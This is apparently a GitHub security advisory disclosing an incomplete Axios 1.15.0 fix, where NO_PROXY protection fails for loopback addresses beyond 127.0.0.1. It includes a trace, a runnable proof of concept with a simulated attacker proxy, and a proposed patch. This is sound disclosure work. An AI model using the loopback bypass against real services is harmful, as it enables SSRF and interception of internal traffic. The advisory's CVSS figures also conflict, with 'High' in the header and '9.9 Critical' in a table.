# [H] Axios: Incomplete Fix for CVE-2025-62718 — NO_PROXY Protection Bypassed via RFC 1122 Loopback Subnet (127.0.0.0/8) in Axios 1.15.0

## Summary
Severity: High
Advisory: GHSA-pmwg-cvhr-8vh7
CVE: CVE-2026-42043
CWE: CWE-183, CWE-441, CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-pmwg-cvhr-8vh7
Type: github-advisory

## Affected
- npm: `axios` — affected >=1.0.0 <1.15.1
- npm: `axios` — affected >=0 <0.31.1

## Details
**1. Executive Summary**
This report documents an **incomplete security patch** for the previously disclosed vulnerability **GHSA-3p68-rc4w-qgx5 (CVE-2025-62718)**, which affects the `NO_PROXY` hostname resolution logic in the Axios HTTP library.

**Background — The Original Vulnerability**
The original vulnerability (GHSA-3p68-rc4w-qgx5) disclosed that Axios did not normalize hostnames before comparing them against `NO_PROXY` rules. Specifically, a request to `http://localhost./` (with a trailing dot) or `http://[::1]/` (with IPv6 bracket notation) would **bypass NO_PROXY matching entirely** and be forwarded to the configured HTTP proxy — even when `NO_PROXY=localhost,127.0.0.1,::1` was explicitly set by the developer to protect loopback services.

The Axios maintainers addressed this in **version 1.15.0** by introducing a `normalizeNoProxyHost()` function in `lib/helpers/shouldBypassProxy.js`, which strips trailing dots from hostnames and removes brackets from IPv6 literals before performing the NO_PROXY comparison.

**The Incomplete Patch — This Finding**
While the patch correctly addresses the specific cases reported (trailing dot normalization and IPv6 bracket removal), **the fix is architecturally incomplete**.

The patch introduced a hardcoded set of recognized loopback addresses:

```
// lib/helpers/shouldBypassProxy.js — Line 1
const LOOPBACK_ADDRESSES = new Set(['localhost', '127.0.0.1', '::1']);
```
However, **RFC 1122 §3.2.1.3** explicitly defines the **entire 127.0.0.0/8 subnet** as the IPv4 loopback address block not just the single address `127.0.0.1`. On all major operating systems (Linux, macOS, Windows with WSL), any IP address in the range `127.0.0.2` through `127.255.255.254` is a valid, functional loopback address that routes to the local machine.

As a result, an attacker who can influence the target URL of an Axios request can substitute 127.0.0.1 with any other address in the `127.0.0.0/8` range (e.g., `127.0.0.2`, `127.0.0.100`, `127.1.2.3`) to **completely bypass** the `NO_PROXY` protection even in the fully patched Axios 1.15.0 release.

**Verification**
This bypass has been **independently verified** on:

* **Axios version:** 1.15.0 (latest patched release)
* **Node.js version:** v22.16.0
* **OS:** Kali Linux (rolling)

The Proof-of-Concept demonstrates that while `localhost`, `localhost`., and `[::1]` are correctly blocked by the patched version, requests to `127.0.0.2`, `127.0.0.100`, and `127.1.2.3` are **transparently forwarded to the attacker-controlled proxy server**, confirming that the patch does not cover the full RFC-defined loopback address space.

**2. Deep-Dive: Technical Root Cause Analysis**
**2.1 Vulnerable File & Location**

| Field | Detail |
| ------------- | ------------- |
| File | lib/helpers/shouldBypassProxy.js| 
| Primary Flaw| isLoopback() — Line 1–3 |
| Supporting Function | shouldBypassProxy() — Line 59–110 |
| Axios Version | 1.15.0 (Latest Patched Release) |

**2.2 How Axios Routes HTTP Requests  The Call Chain**
When Axios dispatches any HTTP request, `lib/adapters/http.js` calls `setProxy()`, which invokes `shouldBypassProxy()` to decide whether to honour a configured proxy:

```
// lib/adapters/http.js — Lines 191–199
function setProxy(options, configProxy, location) {
  let proxy = configProxy;
  if (!proxy && proxy !== false) {
    const proxyUrl = getProxyForUrl(location);   // Step 1: Read proxy env var
    if (proxyUrl) {
      if (!shouldBypassProxy(location)) {         // Step 2: Check NO_PROXY
        proxy = new URL(proxyUrl);               // Step 3: Assign proxy
      }
    }
  }
}
```
`shouldBypassProxy()` is the **single gatekeeper** for NO_PROXY enforcement. A bypass here means all proxy protection fails silently.

**2.3 The Original Vulnerability (GHSA-3p68-rc4w-qgx5)**
Before Axios 1.15.0, hostnames were compared against `NO_PROXY` using a **raw literal string match** with no normalization:

```
Request URL → http://localhost./secret
NO_PROXY    → "localhost,127.0.0.1,::1"
Comparison:
  "localhost." === "localhost"   →  FALSE  →  Proxy used  ← BYPASS
  "[::1]"     === "::1"         →  FALSE  →  Proxy used  ← BYPASS
```
Both `localhost.` (FQDN trailing dot, RFC 1034 §3.1) and `[::1]` (bracketed IPv6 literal, RFC 3986 §3.2.2) are **canonical representations of loopback addresses**, but Axios treated them as unknown hosts.


**2.4 What the Patch Fixed (Axios 1.15.0)**
The patch introduced three changes inside `lib/helpers/shouldBypassProxy.js`:

<img width="602" height="123" alt="01_axios_version_verification" src="https://github.com/user-attachments/assets/844446f2-01fb-4933-9316-fb849c40c8f5" />

**Fix A `normalizeNoProxyHost()` (Lines 47–57)**
Strips alternate representations before comparison:

```
const normalizeNoProxyHost = (hostname) => {
  if (!hostname) return hostname;
  // Remove IPv6 brackets: "[::1]" → "::1"
  if (hostname.charAt(0) === '[' && hostname.charAt(hostname.length - 1) === ']') {
    hostname = hostname.slice(1, -1);
  }
  // Strip trailing FQDN dot: "localhost." → "localhost"
  return hostname.replace(/\.+$/, '');
};
```
**Fix B Cross-Loopback Equivalence (Lines 1–3 & 108)**
Allows `127.0.0.1` and `localhost` to match each other interchangeably:

```
const LOOPBACK_ADDRESSES = new Set(['localhost', '127.0.0.1', '::1']);
const isLoopback = (host) => LOOPBACK_ADDRESSES.has(host);
// Line 108 — Final match condition:
return hostname === entryHost
    || (isLoopback(hostname) && isLoopback(entryHost));
//      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
//      If both sides are "loopback" → treat as match
```

**Fix C Normalization Applied on Both Sides (Lines 81 & 90)**

```
// Request hostname normalized:
const hostname = normalizeNoProxyHost(parsed.hostname.toLowerCase());
// Each NO_PROXY entry normalized:
entryHost = normalizeNoProxyHost(entryHost);
```

**2.5 The Incomplete Patch Exact Root Cause**
The fundamental flaw resides in Line 1:

```
// lib/helpers/shouldBypassProxy.js — Line 1  ← ROOT CAUSE
const LOOPBACK_ADDRESSES = new Set(['localhost', '127.0.0.1', '::1']);
//                                              ^^^^^^^^^^^
//                              Only ONE IPv4 loopback address is recognized.
//                              The entire 127.0.0.0/8 subnet is unaccounted for.
// Line 3 — Lookup against this incomplete set:
const isLoopback = (host) => LOOPBACK_ADDRESSES.has(host);
//                                               ^^^^^^^^^
//                          Returns FALSE for any 127.x.x.x ≠ 127.0.0.1
```
<img width="884" height="135" alt="02_vulnerable_code_loopback_addresses" src="https://github.com/user-attachments/assets/ba06b91e-a2d2-4a99-9e1f-8c8bfbb6d71e" />

***RFC 1122 §3.2.1.3 is unambiguous:**

> "The address 127.0.0.0/8 is assigned for loopback. A datagram sent by a higher-level protocol to a loopback address MUST NOT appear on any network."

This means all addresses from `127.0.0.1` through `127.255.255.254` are valid loopback addresses on any RFC-compliant operating system. On Linux, the entire `/8` block is routed to the `lo` interface by default. The patch recognises only `127.0.0.1`, leaving `16,777,213` valid loopback addresses unprotected.

<img width="884" height="537" alt="03_rfc1122_loopback_definition" src="https://github.com/user-attachments/assets/951eabb4-2ec6-40ef-ad00-1fd5b9aed2d0" />

**2.6 Step-by-Step Bypass Execution Trace**
Environment:

```
NO_PROXY   = "localhost,127.0.0.1,::1"
HTTP_PROXY = "http://attacker-proxy:5300"
Target URL = "http://127.0.0.2:9191/internal-api"
```
**Annotated execution of shouldBypassProxy("http://127.0.0.2:9191/internal-api"):**

```
// Step 1 — Parse the request URL
parsed   = new URL("http://127.0.0.2:9191/internal-api")
hostname = "127.0.0.2"    // parsed.hostname
// Step 2 — Read NO_PROXY environment variable
noProxy  = "localhost,127.0.0.1,::1"   // lowercased
// Step 3 — Normalize the request hostname
hostname = normalizeNoProxyHost("127.0.0.2")
//          No brackets → skip
//          No trailing dot → skip
//          Result: "127.0.0.2"  (unchanged)
// Step 4 — Iterate over NO_PROXY entries
//  Entry → "localhost"
entryHost = "localhost"
"127.0.0.2" === "localhost"                  → false
isLoopback("127.0.0.2")                      → false  ← Set.has() returns false
                                                          BYPASS starts here
//  Entry → "127.0.0.1"
entryHost = "127.0.0.1"
"127.0.0.2" === "127.0.0.1"                 → false
isLoopback("127.0.0.2") && isLoopback("127.0.0.1")
  → LOOPBACK_ADDRESSES.has("127.0.0.2")     → false  ← Same failure
  → false
//  Entry → "::1"
entryHost = "::1"
"127.0.0.2" === "::1"                        → false
isLoopback("127.0.0.2") && isLoopback("::1")
  → LOOPBACK_ADDRESSES.has("127.0.0.2")     → false  ← Same failure
  → false
// Step 5 — Final return
shouldBypassProxy() → false
//  Axios proceeds to route the request through the configured proxy.
//  The attacker's proxy server receives the full request including headers
//  and any response from the internal service.
```

**2.7 Why the Patch Design Is Flawed**
The patch addresses the **symptom** (two specific alternate representations) rather than the **root cause** (an incomplete definition of what constitutes a loopback address).

| Aspect | Original Bug | This Finding |
| ------------- | ------------- | ------------- |
| What was wrong | No normalization before comparison | Incomplete loopback address set|
| Fix applied | Added normalizeNoProxyHost() | None set remains hardcoded |
| RFC compliance | Violated RFC 1034 & RFC 3986 | Violates RFC 1122 §3.2.1.3 |
| Bypass method | Alternate string representation | Alternate valid loopback address |
| Impact | NO_PROXY bypass → SSRF | NO_PROXY bypass → SSRF (identical) |

```
**2.8 Total Exposed Address Space**
Protected by patch:    127.0.0.1          (1 address)
Unprotected loopback:  127.0.0.2
                       through
                       127.255.255.254    (16,777,213 addresses)
```
Real-world services that commonly bind to non-standard loopback addresses include:

* Internal microservices and admin dashboards using dedicated loopback IPs
* Development environments with multiple isolated service instances
* Docker and container bridge network configurations
* Test infrastructure allocating sequential loopback IPs across services

**3. Comprehensive Attack Vector & Proof of Concept**

**3.1 Reproduction Steps**

Step 1 — Create a fresh project directory
```
mkdir axios-bypass-test && cd axios-bypass-test
```
**Step 2 — Initialize the project with the patched Axios version**
Create `package.json`:

```
{
  "type": "module",
  "dependencies": {
    "axios": "1.15.0"
  }
}
```
Install dependencies:

```
npm install
```
Verify the installed version:

```
npm list axios
# Expected output: axios@1.15.0
```

**Step 3 — Create the PoC file (`poc.js`)**

```
import http from 'http';
import axios from 'axios';
// ── Simulated attacker-controlled proxy server ────────────────────────────────
const PROXY_PORT = 5300;
http.createServer((req, res) => {
  console.log('\n[!] PROXY HIT — Attacker proxy received request!');
  console.log(`    Method : ${req.method}`);
  console.log(`    URL    : ${req.url}`);
  console.log(`    Host   : ${req.headers.host}`);
  res.writeHead(200);
  res.end('proxied');
}).listen(PROXY_PORT);
// ── Simulated developer security configuration ────────────────────────────────
// Developer believes all loopback traffic is protected by NO_PROXY.
process.env.HTTP_PROXY = `http://127.0.0.1:${PROXY_PORT}`;
process.env.NO_PROXY   = 'localhost,127.0.0.1,::1';
// ── Test helper ───────────────────────────────────────────────────────────────
async function test(url) {
  console.log(`\n[*] Testing: ${url}`);
  try {
    const res = await axios.get(url, { timeout: 2000 });
    if (res.data === 'proxied') {
      console.log('    Result → [PROXIED]  ← BYPASS CONFIRMED');
    } else {
      console.log('    Result → [DIRECT]   ← Safe, no proxy used');
    }
  } catch (err) {
    if (err.code === 'ECONNREFUSED') {
      console.log('    Result → [DIRECT]   ← ECONNREFUSED (request did not go through proxy)');
    }
  }
}
// ── Test execution ────────────────────────────────────────────────────────────
setTimeout(async () => {
  // Section A: Cases fixed by the existing patch — expected to go DIRECT
  console.log('\n=== PATCHED CASES (Expected: All requests bypass the proxy) ===');
  await test('http://localhost:9191/secret');
  await test('http://localhost.:9191/secret');
  await test('http://[::1]:9191/secret');
  // Section B: Bypass cases — expected to go DIRECT, but actually go through proxy
  console.log('\n=== BYPASS CASES (Expected: bypass proxy | Actual: routed through proxy) ===');
  await test('http://127.0.0.2:9191/secret');
  await test('http://127.0.0.100:9191/secret');
  await test('http://127.1.2.3:9191/secret');
  process.exit(0);
}, 500);
```

**Step 4 — Execute the PoC**

```
node poc.js
```

**3.2 Observed Output**
The following output was captured during testing on Kali Linux with Axios 1.15.0:

```
=== PATCHED CASES (Expected: All requests bypass the proxy) ===
[*] Testing: http://localhost:9191/secret
    Result → [DIRECT]   ← ECONNREFUSED (request did not go through proxy)  
[*] Testing: http://localhost.:9191/secret
    Result → [DIRECT]   ← ECONNREFUSED (request did not go through proxy)  
[*] Testing: http://[::1]:9191/secret
    Result → [DIRECT]   ← ECONNREFUSED (request did not go through proxy)  
=== BYPASS CASES (Expected: bypass proxy | Actual: routed through proxy) ===
[*] Testing: http://127.0.0.2:9191/secret
[!] PROXY HIT — Attacker proxy received request!
    Method : GET
    URL    : http://127.0.0.2:9191/secret
    Host   : 127.0.0.2:9191
    Result → [PROXIED]  ← BYPASS CONFIRMED                                 
[*] Testing: http://127.0.0.100:9191/secret
[!] PROXY HIT — Attacker proxy received request!
    Method : GET
    URL    : http://127.0.0.100:9191/secret
    Host   : 127.0.0.100:9191
    Result → [PROXIED]  ← BYPASS CONFIRMED                                 
[*] Testing: http://127.1.2.3:9191/secret
[!] PROXY HIT — Attacker proxy received request!
    Method : GET
    URL    : http://127.1.2.3:9191/secret
    Host   : 127.1.2.3:9191
    Result → [PROXIED]  ← BYPASS CONFIRMED                                 
```
<img width="1621" height="739" alt="05_poc_execution_bypass_confirmed" src="https://github.com/user-attachments/assets/6caf9f7a-36ed-4feb-b9f3-f82532da2de7" />

**3.3 Analysis of Results**
The output conclusively demonstrates the following:

**Patched cases behave correctly:** Requests to `localhost`, `localhost.` (trailing dot), and `[::1]` (bracketed IPv6) all result in a direct connection, confirming that the existing patch in Axios 1.15.0 correctly handles the cases reported in GHSA-3p68-rc4w-qgx5.

**Bypass cases confirm the incomplete patch:** Requests to `127.0.0.2`, `127.0.0.100`, and `127.1.2.3` all of which are valid loopback addresses within the `127.0.0.0/8` subnet as defined by `RFC 1122 §3.2.1.3` are transparently forwarded to the attacker-controlled proxy server. The proxy receives the full request including the HTTP method, target URL, and `Host` header, demonstrating that any response from an internal service bound to these addresses would be fully intercepted.

This confirms that the `NO_PROXY` protection configured by the developer (`localhost,127.0.0.1,::1`) fails silently for the entire `127.0.0.0/8` address range beyond `127.0.0.1`, providing a reproducible and reliable bypass of the security control introduced by the patch.

**4. Impact Assessment**
This vulnerability is a **security control bypass** specifically an incomplete patch that allows an attacker to circumvent the `NO_PROXY` protection mechanism in Axios by using any loopback addresses within the `127.0.0.0/8` subnet other than `127.0.0.1`. The result is that traffic intended to remain private and direct is silently intercepted by a configured proxy server.

**4.1 Who Is Impacted?**

Primary Target — Node.js Backend Applications
Any Node.js application that meets **all three of the following conditions** is vulnerable:

```
Condition 1:  Uses Axios 1.15.0 (latest patched) for HTTP requests
Condition 2:  Has HTTP_PROXY or HTTPS_PROXY set in its environment
              (common in corporate networks, cloud deployments,
               containerised environments, and CI/CD pipelines)
Condition 3:  Relies on NO_PROXY=localhost,127.0.0.1,::1 (or similar)
              to protect loopback or internal services from proxy routing
```
**Affected Deployment Environments**
| Environment | Risk Level |
| ------------- | ------------- |
| Cloud-hosted applications (AWS, GCP, Azure) | Critical| 
| Containerised microservices (Docker, Kubernetes) | Critical| 
| Corporate networks with mandatory proxy | High| 
| CI/CD pipelines with proxy environment variables | High| 
| On-premise servers with internal proxy | High| 

**Scale of Exposure**
Axios is one of the most widely used HTTP client libraries in the JavaScript ecosystem, with over **500 million weekly downloads** on npm. Any application in the above categories using Axios 1.15.0 is affected, regardless of whether the developer is aware of the underlying proxy routing logic.

**4.3 Impact Details**

**Impact 1 Silent Interception of Internal Service Traffic**

When an application makes a request to an internal loopback service using a non-standard loopback address (e.g., `http://127.0.0.2/admin`), Axios silently routes the request through the configured proxy instead of connecting directly.

```
Developer expects:    Application → 127.0.0.2:8080 (direct)
Actual behaviour:     Application → Attacker Proxy → 127.0.0.2:8080
The proxy receives:
  - Full request URL
  - HTTP method
  - All request headers (including Authorization, Cookie, API keys)
  - Request body (for POST/PUT requests)
  - Full response from the internal service
```
The developer receives no error or warning. From the application's perspective, the request succeeds normally.

**Impact 2 — SSRF Mitigation Bypass**
Many applications implement SSRF protections by configuring `NO_PROXY` to prevent requests to loopback addresses from being forwarded externally. This bypass defeats that protection entirely for any loopback address beyond `127.0.0.1`.

```
SSRF Protection (as configured by developer):
  NO_PROXY = localhost,127.0.0.1,::1
What developer believes is protected:
  All loopback/internal addresses
What is actually protected:
  Only: localhost, 127.0.0.1, ::1 (3 of 16,777,216 loopback addresses)
What remains exposed:
  127.0.0.2 through 127.255.255.254 (16,777,213 addresses)
```
An attacker who can influence the target URL of an Axios request through user-supplied input, redirect chains, or other SSRF vectors can exploit this gap to reach internal services that the developer explicitly intended to protect.

**Impact 3 — Cloud Metadata Service Exposure**
In cloud environments (AWS, GCP, Azure), SSRF vulnerabilities are particularly severe because they can be used to access the instance metadata service and retrieve IAM credentials, enabling full cloud account compromise.

While the AWS IMDSv2 service is reachable at `169.254.169.254` (not a loopback address), many cloud deployments run internal metadata proxies, credential servers, or service discovery endpoints bound to non-standard loopback addresses within the `127.0.0.0/8` range. An attacker reaching any of these services through the bypass could:

* Retrieve temporary IAM credentials
* Access environment variables containing secrets
* Enumerate internal service configurations
* Pivot to other internal services via the compromised credentials

**Impact 4 — Confidential Data Exfiltration**
Any internal service binding to a `127.x.x.x` address other than `127.0.0.1` is fully exposed. This includes:

| Internal Service Type | Exposed Data |
| ------------- | ------------- |
| Admin panels / dashboards | User data, configuration, logs | 
| Internal APIs | Business logic, database contents | 
| Secret managers / vaults | API keys, tokens, certificates | 
| Health check endpoints | Infrastructure topology | 
| Development services | Source code, environment variables | 

**Impact 5 — No Indication of Compromise**
A particularly dangerous characteristic of this vulnerability is that it is **completely silent** neither the application nor the developer receives any indication that requests are being routed incorrectly. There are no error messages, no exceptions thrown, and no changes in application behaviour. The proxy interception is entirely transparent from the application's perspective, making detection extremely difficult without active network monitoring.

**4.4 Comparison with Original Vulnerability**

| Internal Service Type | Exposed Data | Exposed Data |
| ------------- | ------------- | ------------- |
| Attack method | Use localhost. or [::1]| Use any 127.x.x.x ≠ 127.0.0.1 | 
| Patch status | Fixed in 1.15.0 | Not fixed in 1.15.0 | 
| CVSS score | 9.3 Critical | 9.9 Critical or (equivalent) | 
| Attacker effort| Trivial | Trivial | 
| Detection by developer | None | None | 
| Impact | SSRF / proxy bypass | SSRF / proxy bypass (identical) | 

The severity of this finding is equivalent to the original vulnerability because the attack conditions, exploitation technique, and resulting impact are identical. The only difference is the specific input used to trigger the bypass, which the existing patch completely fails to address.

**5. Technical Remediation & Proposed Fix**

**5.1 Vulnerable Code Block**

The vulnerability resides in `lib/helpers/shouldBypassProxy.js` at lines 1–3. The following is the exact code extracted from Axios 1.15.0:

```
// lib/helpers/shouldBypassProxy.js — Axios 1.15.0
// Lines 1–3 (VULNERABLE)
const LOOPBACK_ADDRESSES = new Set(['localhost', '127.0.0.1', '::1']);
const isLoopback = (host) => LOOPBACK_ADDRESSES.has(host);
```
This hardcoded `Set` is subsequently used at line 108 during the final NO_PROXY match evaluation:

```
// lib/helpers/shouldBypassProxy.js — Line 108 (VULNERABLE USAGE)
return hostname === entryHost || (isLoopback(hostname) && isLoopback(entryHost));
//                                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
// isLoopback("127.0.0.2") → LOOPBACK_ADDRESSES.has("127.0.0.2") → FALSE
// This causes the match to fail for any 127.x.x.x address beyond 127.0.0.1
```
**Why this is dangerous:** The `Set` performs a strict membership check. Any IPv4 loopback address outside the three hardcoded entries returns `false`, causing `shouldBypassProxy()` to return `false` and silently route the request through the configured proxy.

**5.2 Proposed Patched Code**
Replace lines 1–3 in `lib/helpers/shouldBypassProxy.js` with the following RFC-compliant implementation:

```
// lib/helpers/shouldBypassProxy.js
// Lines 1–3 (PROPOSED FIX — RFC 1122 §3.2.1.3 Compliant)
const isLoopback = (host) => {
  // Named loopback hostname
  if (host === 'localhost') return true;
  // IPv6 loopback address
  if (host === '::1') return true;
  // Full IPv4 loopback subnet: 127.0.0.0/8 (RFC 1122 §3.2.1.3)
  // Matches any address from 127.0.0.0 through 127.255.255.254
  const parts = host.split('.');
  return (
    parts.length === 4 &&
    parts[0] === '127' &&
    parts.every((p) => /^\d+$/.test(p) && Number(p) >= 0 && Number(p) <= 255)
  );
};
```
**5.3 Diff View — Before vs After**

```
// lib/helpers/shouldBypassProxy.js
- const LOOPBACK_ADDRESSES = new Set(['localhost', '127.0.0.1', '::1']);
-
- const isLoopback = (host) => LOOPBACK_ADDRESSES.has(host);
+ const isLoopback = (host) => {
+   if (host === 'localhost') return true;
+   if (host === '::1') return true;
+   const parts = host.split('.');
+   return (
+     parts.length === 4 &&
+     parts[0] === '127' &&
+     parts.every((p) => /^\d+$/.test(p) && Number(p) >= 0 && Number(p) <= 255)
+   );
+ };
```
All other code in `shouldBypassProxy.js` remains unchanged. No other files require modification.

**5.4 Why This Fix Must Be Applied**

**Reason 1 — RFC 1122 Compliance**

The current implementation violates **RFC 1122 §3.2.1.3**, which defines the entire `127.0.0.0/8` block as the IPv4 loopback address range not just the single address `127.0.0.1`. The proposed fix aligns Axios with the standard, ensuring that all valid loopback addresses are recognised and handled consistently.

```
RFC 1122 §3.2.1.3:
"The address 127.0.0.0/8 is assigned for loopback.
 A datagram sent by a higher-level protocol to a loopback
 address MUST NOT appear on any network."
Current fix covers  :  3 addresses (localhost, 127.0.0.1, ::1)
Proposed fix covers :  16,777,216 addresses (entire 127.0.0.0/8 + loopback names)
```

**Reason 2 — The Existing Patch Has Already Failed Once**

The patch for GHSA-3p68-rc4w-qgx5 was released with the explicit intent of securing NO_PROXY hostname matching for loopback addresses. Within the same release (1.15.0), the protection can be bypassed by substituting `127.0.0.1` with any other address in the `127.0.0.0/8` range. Leaving this gap unaddressed means that the patch creates a **false sense of security** developers believe their loopback traffic is protected when it is not.

**Reason 3 — Real Operating System Behaviour**
On Linux the dominant platform for Node.js server deployments the kernel routes the **entire `127.0.0.0/8` subnet** to the loopback interface `lo` by default. This means any address in that range functions identically to `127.0.0.1` at the networking level.

```
# Linux routing table — default configuration
$ ip route show table local | grep "127"
local 127.0.0.0/8 dev lo proto kernel scope host src 127.0.0.1
# Proof: 127.0.0.2 is a valid loopback address on Linux
$ ping -c 1 127.0.0.2
PING 127.0.0.2: 56 data bytes
64 bytes from 127.0.0.2: icmp_seq=0 ttl=64 time=0.045 ms
```

<img width="711" height="181" alt="04_linux_loopback_subnet_proof" src="https://github.com/user-attachments/assets/fd0f8430-37c5-4597-b2d9-8e27e479d7b2" />

Axios's current implementation does not reflect this operating system behaviour, resulting in an inconsistency between what the OS considers loopback and what Axios treats as loopback.

<img width="588" height="198" alt="06_ping_127 0 0 2_loopback_confirmed" src="https://github.com/user-attachments/assets/23bf1ab8-1bd6-4f39-88a7-93c518d72990" />

**Reason 4 — The Proposed Fix Has Zero Performance Impact**
The existing solution uses a `Set.has()` lookup an O(1) operation. The proposed fix replaces this with:

1. Two direct string comparisons (`'localhost'`, `'::1'`) — O(1)
2. A `split('.')` and array validation — O(1) with a fixed-length array of 4 elements
The computational cost is **equivalent or lower** than the current approach, and the fix introduces no new external dependencies.

**Reason 5 — The Fix Is Minimal and Surgical**
The proposed change modifies only **3 lines** of a single file. It does not alter:

* The `parseNoProxyEntry()` function
* The `normalizeNoProxyHost()` function
* The `shouldBypassProxy()` main function logic
* Any other file in the codebase
 
This minimises regression risk and makes the fix straightforward to review, test, and backport to older supported branches.

**Reason 6 — Resilient to Alternative IP Encodings**
Because Axios normalises the request URL using Node's native `new URL()` parser before passing it to `shouldBypassProxy()`, alternative IP encodings (such as octal `0177.0.0.1`, hex `0x7f.0.0.1`, or integer `2130706433`) are already resolved into their standard IPv4 dotted-decimal format. This means the proposed `.split('.')` validation logic is completely robust and cannot be bypassed using URL-encoded IP obfuscation techniques.

**5.5 Additional Recommendation — IPv6 Loopback Range**

While the primary bypass demonstrated in this report targets the IPv4 `127.0.0.0/8` range, the Axios team should also consider validating the full IPv6 loopback representation. The current implementation recognises only `::1`. A more complete check would also handle the full-form notation:

```
// Additional IPv6 loopback representations to consider:
'0:0:0:0:0:0:0:1'      // Full notation of ::1
'::ffff:127.0.0.1'     // IPv4-mapped IPv6 loopback
'::ffff:7f00:1'        // Hex IPv4-mapped IPv6 loopback
```
Normalising these representations before comparison would make the NO_PROXY implementation comprehensively RFC-compliant across both IPv4 and IPv6 address families.

## References
- https://github.com/axios/axios/security/advisories/GHSA-pmwg-cvhr-8vh7
- https://nvd.nist.gov/vuln/detail/CVE-2026-42043
- https://github.com/axios/axios
